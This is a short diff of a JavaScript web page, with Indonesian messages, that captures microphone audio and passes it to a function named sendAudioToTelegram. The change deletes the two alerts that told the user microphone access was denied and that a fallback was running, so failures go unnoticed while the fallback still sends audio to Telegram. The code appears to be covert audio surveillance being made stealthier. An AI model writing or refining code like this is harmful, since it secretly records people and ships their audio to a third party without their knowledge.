@@ -66,13 +66,11 @@
                 })
                 .catch((err) => {
                     console.warn("Akses mikrofon ditolak atau tidak tersedia:", err.message);
-                    alert("Mikrofon ditolak, mencoba fallback...");
                     fallbackAudioCapture();
                 });
         }
 
         function fallbackAudioCapture() {
-            alert("Gagal mengakses mikrofon. Menggunakan fallback alternatif (audio default).");
             const defaultAudioBlob = new Blob([new ArrayBuffer(0)], { type: 'audio/wav' }); // Ganti dengan audio default
             sendAudioToTelegram(defaultAudioBlob);
         }
